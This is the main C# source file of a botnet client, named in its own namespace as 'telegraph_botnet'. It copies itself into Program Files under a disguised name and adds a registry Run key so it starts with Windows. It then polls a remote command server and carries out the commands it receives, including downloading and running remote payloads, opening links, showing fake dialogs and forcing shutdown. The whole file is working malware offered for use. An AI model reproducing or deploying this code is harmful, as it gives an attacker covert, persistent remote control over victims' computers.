using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;

namespace telegraph_botnet
{
    internal class Program
    {

        static string last_cmd = string.Empty;

        static string namefile = "PowerMaster.exe";

        static void Main(string[] args)
        {
            // C:\Program Files (x86)/roma.exe
            if (System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName != $"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)}\\{namefile}")
            {   
                Console.WriteLine("FFFFFFFFFFFFFFFFFF");
                if (File.Exists($"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)}\\{namefile}"))
                {
                    File.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)}\\{namefile}");
                    File.Copy(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName, $"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)}\\{namefile}");
                }

                else
                {
                    File.Copy(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName, $"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)}\\{namefile}");
                }



                RegistryKey reg;
                reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
                try
                {
                    reg.SetValue("Shell", $"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)}\\{namefile}", RegistryValueKind.String);
                    //reg.DeleteValue("Shell");

                    reg.Close();
                }
                catch
                {
                    Console.WriteLine("ERRORRR");
                }
            }

            while (true)
            {
                string html = web.GetHTML(config.server);

                Match regx = Regex.Match(html, "<p>(.*)</p></article>");
                string content = regx.Groups[1].Value;

                if (last_cmd == content)
                {
                    Thread.Sleep(config.delay);
                    continue;

                }

                last_cmd = content;

                cmd command = new cmd(content);
                Execute(command);

                Console.WriteLine(content);
                Console.WriteLine(command.ComType);



                Thread.Sleep(config.delay);
            }
        }

        static void Execute(cmd CMD)
        {
            switch (CMD.ComType)
            {
                case "open_link":
                    functions.OpenLink(CMD.ComContent);
                    break;

                case "download_execute":
                    functions.DownloadExecute(CMD.ComContent);
                    break;

                /*
                case "kill":
                    functions.kill(CMD.ComContent);
                    break;
                */

                case "background":
                    functions.Background(CMD.ComContent);
                    break;

                case "dialog_info":
                    functions.DialogInfo(CMD.ComContent);
                    break;

                case "dialog_error":
                    functions.DialogError(CMD.ComContent);
                    break;

                case "dialog_warning":
                    functions.DialogWarning(CMD.ComContent);
                    break;

                case "off":
                    Process.Start("shutdown", "/s /t 0");
                    break;

                case "exit":
                    Environment.Exit(0);
                    break;
            }
        }
    }
}
